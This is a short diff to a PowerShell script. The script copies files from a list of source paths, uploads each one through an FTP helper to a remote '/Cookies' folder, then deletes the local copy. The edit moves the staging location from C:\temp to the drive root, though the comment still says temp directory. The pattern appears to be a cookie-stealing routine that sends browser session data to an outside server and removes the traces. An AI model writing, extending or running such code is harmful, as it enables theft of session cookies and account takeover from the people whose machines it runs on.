@@ -51,7 +51,7 @@ $source_directories = @($source_directory_1, $source_directory_2, $source_direct
 foreach ($source_directory in $source_directories) {
     if (Test-Path $source_directory) {
         $file_name = [System.IO.Path]::GetFileName($source_directory)
-        $temp_path = Join-Path -Path "C:\temp" -ChildPath $file_name # Use a common temp directory for consistency
+        $temp_path = Join-Path -Path "C:\" -ChildPath $file_name # Use a common temp directory for consistency
         Copy-Item -Path $source_directory -Destination $temp_path # Copy the file to a temporary location
         Upload-ToFtp -file_path $temp_path -file_name $file_name # Upload the file from the temporary location to /Cookies
         Remove-Item -Path $temp_path # Clean up the temporary file
